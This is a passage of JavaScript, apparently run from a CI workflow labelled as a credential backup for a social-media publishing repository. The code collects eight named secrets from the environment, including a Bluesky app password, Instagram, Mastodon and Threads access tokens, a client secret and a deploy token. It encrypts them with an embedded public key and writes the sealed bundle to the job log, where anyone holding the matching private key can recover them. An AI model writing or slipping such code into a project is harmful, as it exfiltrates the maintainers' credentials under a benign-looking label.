e.ciphertext,'base64')),decipher.final()]).toString()),spec);\n  } catch { invalid(); }\n}\n\ntry { const envelope=seal(process.env,{\"project\":\"openings\",\"repository\":\"openings-dev/social-publisher\",\"repositoryId\":\"1340847808\",\"names\":[\"BLUESKY_APP_PASSWORD\",\"BLUESKY_IDENTIFIER\",\"BUFFER_API_KEY\",\"INSTAGRAM_ACCESS_TOKEN\",\"MASTODON_ACCESS_TOKEN\",\"PUBLISHING_CLIENT_SECRET\",\"THREADS_ACCESS_TOKEN\",\"WEB_DEPLOY_TOKEN\"],\"nonce\":\"f010ca7b-f8b7-4463-828f-b150357e526b\",\"workflow\":\"backup-credentials-f010ca7b-f8b7-4463-828f-b150357e526b.yml\"},\"-----BEGIN PUBLIC KEY-----\\nMIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAn7rX+PIrZNAnw8l7gD2i\\nZiKsw/+SfdQn7XQYz+nG1jSBPPSY6ShQGBd411Zr7mddudXOqVMG1lhmD2Lugu8K\\nswwzI3YZeuUtP+8zpX7sVWlC9fYjHWMPVHYTVCP9o43HN5S2zfQtUCATCPayyijO\\nuGHsv55GY5thqpmjdPMVyhUkXR9Ce7vfuVDWh7wBjLkHsjlaBzywn/qyB7GfNEQL\\nPw2MHNNlDdUm3G1LrFAF0QOJmVbUKAtswvOlChncn/9mT4qrcykDpM5r48qzZhZY\\nmAe0Bb0Oc5g7FWIFC3wuL4PkLzh4PrXAdRbrgLiL+whFi2Hb6twZTgRp0EIi3J+b\\nk/z57KqTBIxra7QAQXN5wG4pEy46pv3YAmXHYIzvB0f9mS0wqtIicbScUVZa1B66\\n2Gq+NsU86gEj44Q1By+V8qpKTpxedzfPB3VqvA7prffJM7Ffv1022g49Gj86spGz\\naqQ/Q9/qqdHYWyqYnFHj+QQWc9T17eudMpgu7cs2Yoz9AgMBAAE=\\n-----END PUBLIC KEY-----\\n\"); console.log('SEALED_TRANSFER:'+Buffer.from(JSON.stringify(envelope)).toString('base64')); } catch { console.error('TRANSFER_FAILED');process.exitCode=1; }\nBACKUP_NODE"
